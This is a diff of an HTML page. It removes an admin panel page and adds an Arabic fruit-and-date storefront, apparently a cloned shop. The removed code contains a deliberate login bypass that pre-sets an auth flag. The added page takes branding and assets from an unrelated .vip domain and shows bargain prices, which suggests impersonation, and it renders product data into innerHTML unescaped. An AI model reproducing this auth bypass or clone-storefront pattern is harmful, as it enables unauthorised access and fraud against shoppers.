@@ -1,56 +1,546 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
-    <title>Zain Control Panel</title>
-    <meta name="description" content="Zain Control Panel — built on Replit. Update this description to reflect the app." />
-    <meta name="robots" content="index, follow" />
-    <meta property="og:title" content="Zain Control Panel" />
-    <meta property="og:description" content="Zain Control Panel — built on Replit. Update this description to reflect the app." />
-    <meta property="og:type" content="website" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="Zain Control Panel" />
-    <meta name="twitter:description" content="Zain Control Panel — built on Replit. Update this description to reflect the app." />
-    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <!-- إيقاف الأصوات - Disable Sounds -->
-    <script src="./disable-sounds.js"></script>
-    <!-- TEMP error reporter -->
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+    <script src="./assets/js/firebase-client.js"></script>
+    <script src="./assets/js/products-store.js"></script>
+    <title>مزارع الثنيان - Althenayan Farms</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+        body {
+            background-color: #f8f9fa;
+            color: #111;
+            padding-bottom: 120px;
+        }
+        
+        /* رأس الصفحة العلوي */
+        .MainContainer_headerContainer__RY5Ne {
+            background: #fff;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .Header_header__HSEQ9 {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 12px 30px;
+        }
+        .Header_nav__DVSK7 {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .Header_logoWithCatalog__v4fgc {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .Logo_logo__oq6_b {
+            display: block;
+            width: 140px;
+            height: 40px;
+            position: relative;
+        }
+        .Logo_fullLogo__l2rPp {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        .CatalogButton_button__wTnA9 {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #f1f3f5;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .CartButton_wrapper__DN_bX .Button_primary__SrbPy {
+            background-color: #004d7a;
+            color: #fff;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+
+        /* حاوية المحتوى الرئيسية */
+        .ContentWrapper_container__T9e2i {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        h1.Typography_h1__cT2UT {
+            font-size: 38px;
+            font-weight: 800;
+            margin: 20px 0 15px 0;
+        }
+
+        /* أزرار الفلاتر الأفقية تحت العنوان */
+        .FilterPresets_wrapper__sSfR_ {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+        .FilterPresets_filter__czMu5 {
+            background: #f1f3f5;
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #111;
+        }
+        .FilterPresets_filter__czMu5 img {
+            width: 18px;
+            height: 18px;
+            object-fit: contain;
+        }
+
+        /* شريط تفاصيل المتجر */
+        ._slug__merchantDetailsWrapper__Ni_d0 {
+            background: #fff;
+            border-radius: 20px;
+            padding: 20px 30px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+            margin-bottom: 30px;
+        }
+        .MerchantDetails_wrapper__NGWQ1 {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 700px;
+        }
+        .MerchantDetails_detail__ez3c5 {
+            text-align: right;
+        }
+        .MerchantDetails_label__diWJe {
+            color: #888;
+            font-size: 13px;
+            margin-bottom: 5px;
+        }
+        .Typography_p1__A2FUF {
+            font-size: 18px;
+            font-weight: 700;
+        }
+        .MerchantDetails_open__C8KJd {
+            color: #2b8a3e;
+            background: #e6fcf5;
+            padding: 4px 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        /* شبكة المنتجات */
+        .ProductsGrid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+        .ProductCard {
+            background: #fff;
+            border-radius: 24px;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+            position: relative;
+            min-height: 160px;
+        }
+        .ProductInfo {
+            flex: 1;
+            padding-left: 15px;
+        }
+        .ProductName {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #111;
+        }
+        .ProductDesc {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 12px;
+            line-height: 1.4;
+        }
+        .ProductPrice {
+            font-size: 17px;
+            font-weight: 800;
+            color: #111;
+        }
+        .ProductImageWrapper {
+            width: 110px;
+            height: 110px;
+            border-radius: 18px;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+        .ProductImageWrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        /* زر الإضافة الأولي */
+        .AddButton {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            padding: 6px 20px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+            color: #111;
+        }
+
+        /* حاوية عداد الكمية (تظهر عند الإضافة) */
+        .QuantityController {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            padding: 4px 10px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        .QuantityController button {
+            background: none;
+            border: none;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            color: #004d7a;
+            padding: 0 4px;
+        }
+
+        /* شريط السلة العائم أسفل الشاشة */
+        .FloatingCartBar {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 90%;
+            max-width: 1150px;
+            background-color: #cccccc; /* لون باهت افتراضياً عندما تكون فارغة */
+            color: #666666;
+            border-radius: 20px;
+            padding: 16px 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+            cursor: default;
+            transition: all 0.3s ease;
+        }
+        .FloatingCartBar.active-cart {
+            background-color: #004d7a;
+            color: white;
+            box-shadow: 0 10px 25px rgba(0, 77, 122, 0.3);
+            cursor: pointer;
+        }
+        .FloatingCartBar .cart-text {
+            font-size: 18px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .FloatingCartBar .cart-badge {
+            background: #e0e0e0;
+            color: #666;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        .FloatingCartBar.active-cart .cart-badge {
+            background: #ffffff;
+            color: #004d7a;
+        }
+        .FloatingCartBar .cart-price {
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        @media (max-width: 768px) {
+            .ProductsGrid {
+                grid-template-columns: 1fr;
+            }
+            .MerchantDetails_wrapper__NGWQ1 {
+                flex-wrap: wrap;
+                gap: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- رأس الصفحة العلوي -->
+    <div class="MainContainer_headerContainer__RY5Ne">
+        <header class="Header_header__HSEQ9">
+            <div class="Header_nav__DVSK7">
+                <div class="Header_logoWithCatalog__v4fgc">
+                    <a class="Logo_logo__oq6_b" href="#">
+                        <img alt="Snoonu" src="https://theenyanl30.vip/views/assets/source/nfc2.png" class="Logo_fullLogo__l2rPp">
+                    </a>
+                    <button class="CatalogButton_button__wTnA9">
+                        <span>القائمة</span>
+                    </button>
+                </div>
+                <div class="Header_sideWrapper__3FSV4">
+                    <div class="CartButton_wrapper__DN_bX">
+                        <button class="Button_button__xKXcy Button_primary__SrbPy" onclick="window.location.href='creatprogect.html'" style="background-color: #2b8a3e; margin-left: 10px; display: none;">
+                            <span>⚙️ إدارة المنتجات</span>
+                        </button>
+                        <button class="Button_button__xKXcy Button_primary__SrbPy">
+                            <span id="header-total">0.000 د.ك</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </header>
+    </div>
+
+    <div class="ContentWrapper_container__T9e2i">
+        <!-- عنوان المتجر -->
+        <h1 class="Typography_h1__cT2UT">مزارع الثنيان</h1>
+        
+        <!-- أزرار الفلاتر الأفقية -->
+        <div class="FilterPresets_wrapper__sSfR_">
+            <div class="FilterPresets_filter__czMu5">
+                <img src="https://theenyanl30.vip/views/assets/source/free_delivery.33e8a802.svg" alt="توصيل مجاني">
+                <span>توصيل مجاني</span>
+            </div>
+            <div class="FilterPresets_filter__czMu5">
+                <span>خلال 40 دقيقة</span>
+            </div>
+            <div class="FilterPresets_filter__czMu5">
+                <span>نقل مخصص</span>
+            </div>
+        </div>
+
+        <!-- تفاصيل المتجر -->
+        <div class="_slug__merchantDetailsWrapper__Ni_d0">
+            <div class="MerchantDetails_wrapper__NGWQ1">
+                <div class="MerchantDetails_detail__ez3c5">
+                    <p class="MerchantDetails_label__diWJe">وقت التوصيل</p>
+                    <p class="Typography_p1__A2FUF">40 دقيقة</p>
+                </div>
+                <div class="MerchantDetails_detail__ez3c5">
+                    <p class="MerchantDetails_label__diWJe">التقييم</p>
+                    <p class="Typography_p1__A2FUF">4.7</p>
+                </div>
+                <div class="MerchantDetails_detail__ez3c5">
+                    <p class="MerchantDetails_label__diWJe">المسافة</p>
+                    <p class="Typography_p1__A2FUF">15 كيلو</p>
+                </div>
+                <div class="MerchantDetails_detail__ez3c5">
+                    <p class="MerchantDetails_label__diWJe">ساعات العمل</p>
+                    <p class="Typography_p1__A2FUF">
+                        <span class="MerchantDetails_status__UAoUR MerchantDetails_open__C8KJd">مفتوح</span>
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- قائمة المنتجات -->
+        <div class="ProductsGrid" id="productsGrid">
+            <!-- سيتم ملء المنتجات بواسطة JavaScript -->
+        </div>
+    </div>
+
+    <!-- شريط السلة العائم السفلي -->
+    <div class="FloatingCartBar" id="floating-cart-bar" onclick="goToCart()">
+        <div class="cart-text" id="cart-text-content">
+            سلة المنتجات فارغة
+        </div>
+        <div style="display: flex; align-items: center; gap: 12px;">
+            <span class="cart-price" id="footer-total">0.000 د.ك</span>
+            <div class="cart-badge" id="footer-count">0</div>
+        </div>
+    </div>
+
     <script>
-      window.addEventListener('error', function(e){
-        var d=document.getElementById('root')||document.body;
-        var p=document.createElement('pre');
-        p.style.cssText='color:red;background:#fff;padding:10px;font-size:14px;white-space:pre-wrap;z-index:99999;position:relative';
-        p.textContent='[JS ERROR] '+e.message+' \n @ '+(e.filename||'')+':'+e.lineno+':'+e.colno+'\n'+(e.error&&e.error.stack||'');
-        d.parentNode.insertBefore(p,d);
-      });
-      window.addEventListener('unhandledrejection', function(e){
-        var d=document.getElementById('root')||document.body;
-        var p=document.createElement('pre');
-        p.style.cssText='color:darkred;background:#fee;padding:10px;font-size:14px;z-index:99999;position:relative';
-        p.textContent='[UNHANDLED PROMISE] '+(e.reason&&(e.reason.message||e.reason))+'\n'+(e.reason&&e.reason.stack||'');
-        d.parentNode.insertBefore(p,d);
-      });
+        const defaultProducts = [
+            { name: 'عرض التين الأخضر الفاخر', desc: 'بوكس 5 كيلو تين أخضر فاخر.', price: '3.500', img: 'https://theenyanl30.vip/views/assets/source/top1.png' },
+            { name: 'عرض تمر الصقعى الملكى', desc: 'بوكس 5 كيلو تمر صقعى ملكى فاخر.', price: '3.960', img: 'https://theenyanl30.vip/views/assets/source/top2.png' },
+            { name: 'عرض تمر الخلاص المكبوس', desc: 'بوكس 8 كيلو تمر الخلاص المكبوس درجة أولى.', price: '3.500', img: 'https://theenyanl30.vip/views/assets/source/top3.png' },
+            { name: 'عرض 50 عصفور التين', desc: 'بوكس 50 عصفور تين درجة أولى حجم كبير.', price: '10.000', img: 'https://theenyanl30.vip/views/assets/source/batt-5.jpg' }
+        ];
+
+        // تهيئة المنتجات الافتراضية في localStorage إذا لم تكن موجودة
+        function initializeDefaultProducts() {
+            const stored = JSON.parse(localStorage.getItem('allProducts')) || [];
+            if (stored.length === 0) {
+                localStorage.setItem('allProducts', JSON.stringify(defaultProducts));
+            }
+        }
+
+        function renderProducts(allProducts) {
+            const grid = document.getElementById('productsGrid');
+            if (!grid) return;
+            grid.innerHTML = allProducts.map((product, index) => `
+                <div class="ProductCard" data-price="${product.price}">
+                    <div class="ProductInfo">
+                        <h3 class="ProductName">${product.name}</h3>
+                        <p class="ProductDesc">${product.desc}</p>
+                        <div class="ProductPrice">${product.price} د.ك</div>
+                    </div>
+                    <div class="ProductImageWrapper">
+                        <img src="${product.img}" alt="${product.name}">
+                    </div>
+                    <button class="AddButton" onclick="updateQuantity(this, 1)">إضافة</button>
+                </div>
+            `).join('');
+        }
+
+        async function loadProducts() {
+            initializeDefaultProducts();
+            // المصدر الأساسي: Firestore عبر طبقة المزامنة (مع احتياطي محلي)
+            let allProducts;
+            if (typeof window.storeGetProducts === 'function') {
+                allProducts = await window.storeGetProducts();
+                if (!allProducts || allProducts.length === 0) {
+                    allProducts = JSON.parse(localStorage.getItem('allProducts')) || defaultProducts;
+                }
+            } else {
+                allProducts = JSON.parse(localStorage.getItem('allProducts')) || defaultProducts;
+            }
+            renderProducts(allProducts);
+            // تحديث لحظي عند تغيير المنتجات من لوحة الإدارة
+            if (typeof window.storeWatchProducts === 'function') {
+                window.storeWatchProducts(function (items) { renderProducts(items); });
+            }
+        }
+
+        // تحميل المنتجات عند فتح الصفحة
+        document.addEventListener('DOMContentLoaded', loadProducts);
+
+        function updateQuantity(buttonElement, change) {
+            const card = buttonElement.closest('.ProductCard');
+            let controller = card.querySelector('.QuantityController');
+            
+            if (!controller) {
+                controller = document.createElement('div');
+                controller.className = 'QuantityController';
+                controller.innerHTML = `
+                    <button onclick="adjustQty(this, -1)">-</button>
+                    <span class="qty-val">1</span>
+                    <button onclick="adjustQty(this, 1)">+</button>
+                `;
+                buttonElement.replaceWith(controller);
+            } else {
+                let qtySpan = controller.querySelector('.qty-val');
+                let currentQty = parseInt(qtySpan.textContent) + change;
+                
+                if (currentQty <= 0) {
+                    const newAddBtn = document.createElement('button');
+                    newAddBtn.className = 'AddButton';
+                    newAddBtn.textContent = 'إضافة';
+                    newAddBtn.setAttribute('onclick', 'updateQuantity(this, 1)');
+                    controller.replaceWith(newAddBtn);
+                } else {
+                    qtySpan.textContent = currentQty;
+                }
+            }
+            calculateTotal();
+        }
+
+        function adjustQty(btn, change) {
+            const controller = btn.closest('.QuantityController');
+            const qtySpan = controller.querySelector('.qty-val');
+            let currentQty = parseInt(qtySpan.textContent) + change;
+            
+            if (currentQty <= 0) {
+                const card = btn.closest('.ProductCard');
+                const newAddBtn = document.createElement('button');
+                newAddBtn.className = 'AddButton';
+                newAddBtn.textContent = 'إضافة';
+                newAddBtn.setAttribute('onclick', 'updateQuantity(this, 1)');
+                controller.replaceWith(newAddBtn);
+            } else {
+                qtySpan.textContent = currentQty;
+            }
+            calculateTotal();
+        }
+
+        function calculateTotal() {
+            let total = 0;
+            let totalCount = 0;
+            
+            document.querySelectorAll('.ProductCard').forEach(card => {
+                const controller = card.querySelector('.QuantityController');
+                if (controller) {
+                    const qty = parseInt(controller.querySelector('.qty-val').textContent);
+                    const price = parseFloat(card.getAttribute('data-price'));
+                    total += qty * price;
+                    totalCount += qty;
+                }
+            });
+
+            const formattedTotal = total.toFixed(3) + ' د.ك';
+            document.getElementById('header-total').textContent = formattedTotal;
+            document.getElementById('footer-total').textContent = formattedTotal;
+            document.getElementById('footer-count').textContent = totalCount;
+
+            const cartBar = document.getElementById('floating-cart-bar');
+            const cartText = document.getElementById('cart-text-content');
+
+            if (totalCount > 0) {
+                // إذا تم اختيار منتجات
+                cartBar.classList.add('active-cart');
+                cartText.innerHTML = `<span>&#8249;</span> اذهب الى السلة`;
+            } else {
+                // إذا كانت السلة فارغة
+                cartBar.classList.remove('active-cart');
+                cartText.textContent = 'سلة المنتجات فارغة';
+            }
+        }
+
+        function goToCart() {
+            let totalCount = parseInt(document.getElementById('footer-count').textContent);
+            if (totalCount > 0) {
+                window.location.href = 'cartepage.html';
+            }
+        }
     </script>
-    <!-- Firebase Configuration -->
-    <script src="./firebase-config.js"></script>
-    <!-- ⚠️ PRODUCTION BYPASS: يسمح بتسجيل الدخول بدون التحقق من Firebase مؤقتاً -->
-    <script>
-      (function () {
-        try {
-          var k = "zain_auth";
-          if (!localStorage.getItem(k)) localStorage.setItem(k, "1");
-          console.log("%c[PROD BYPASS] zain_auth flag pre-set — login متاح بدون Firebase", "color:#0a0;font-weight:bold;");
-        } catch (e) {}
-      })();
-    </script>
-    <script type="module" crossorigin src="./assets/index-cfjlmbui.js?v=DK12"></script>
-    <link rel="stylesheet" crossorigin href="./assets/index-cdllrzoq.css">
-  </head>
-  <body>
-    <div id="root"></div>
-  </body>
+</body>
 </html>
